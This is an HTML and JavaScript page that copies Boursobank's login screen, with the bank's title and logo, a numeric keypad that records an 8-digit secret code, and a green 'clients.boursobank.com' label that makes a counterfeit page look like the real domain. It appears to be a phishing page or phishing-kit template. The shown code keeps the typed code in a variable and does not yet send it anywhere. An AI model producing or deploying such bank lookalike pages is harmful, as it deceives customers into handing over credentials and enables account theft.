<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boursobank - Connexion</title>
    <style>
        /* Style général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 100%;
        }

        /* Logo principal */
        .top-logo img {
            max-width: 200px;
        }

        /* Conteneur principal */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px 20px;
            text-align: center;
            position: relative;
        }

        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        /* Identification affichée */
        .identifier-display {
            font-size: 1.5rem;
            font-weight: bold;
            color: #003883;
            margin: 15px 0;
        }

        /* Texte de vérification */
        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Mot de passe (cercles) */
        .password-dots {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }

        .password-dot {
            width: 20px;
            height: 20px;
            border: 2px solid #003883;
            border-radius: 50%;
        }

        /* Pavé numérique */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px auto;
        }

        .keypad-button {
            width: 60px;
            height: 60px;
            border: 2px solid #003883;
            border-radius: 50%;
            font-size: 1.2rem;
            font-weight: bold;
            color: #003883;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: white;
            transition: background 0.2s;
        }

        .keypad-button:hover {
            background: #f0f0f0;
        }

        /* Bouton vocalisation */
        .vocalization {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 10px 0;
            gap: 5px;
        }

        .vocalization-toggle {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 1rem;
            color: #003883;
        }

        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60064b1;
        }

        /* Footer */
        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Contenu -->
            <div class="form-content">
                <div class="identifier-display" id="identifierDisplay">454545</div>

                <div class="verification-box">
                    clients.boursobank.com
                </div>

                <!-- Cercles du mot de passe -->
                <div class="password-dots" id="passwordDots">
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                    <div class="password-dot"></div>
                </div>

                <!-- Pavé numérique -->
                <div class="keypad">
                    <div class="keypad-button" onclick="enterDigit(1)">1</div>
                    <div class="keypad-button" onclick="enterDigit(2)">2</div>
                    <div class="keypad-button" onclick="enterDigit(3)">3</div>
                    <div class="keypad-button" onclick="enterDigit(4)">4</div>
                    <div class="keypad-button" onclick="enterDigit(5)">5</div>
                    <div class="keypad-button" onclick="enterDigit(6)">6</div>
                    <div class="keypad-button" onclick="enterDigit(7)">7</div>
                    <div class="keypad-button" onclick="enterDigit(8)">8</div>
                    <div class="keypad-button" onclick="enterDigit(9)">9</div>
                    <div class="keypad-button" onclick="enterDigit(0)">0</div>
                </div>

                <!-- Activation de la vocalisation -->
                <div class="vocalization">
                    <span>Activer la vocalisation</span>
                </div>

                <!-- Bouton -->
                <button class="btn">Je me connecte</button>
            </div>
        </div>

        <!-- Liens -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>

    <script>
        let password = "";
        const maxPasswordLength = 8;

        function enterDigit(digit) {
            if (password.length < maxPasswordLength) {
                password += digit;
                updatePasswordDisplay();
            }
        }

        function updatePasswordDisplay() {
            const dots = document.querySelectorAll('.password-dot');
            for (let i = 0; i < dots.length; i++) {
                if (i < password.length) {
                    dots[i].style.background = '#003883';
                } else {
                    dots[i].style.background = 'white';
                }
            }
        }
    </script>
</body>
</html>
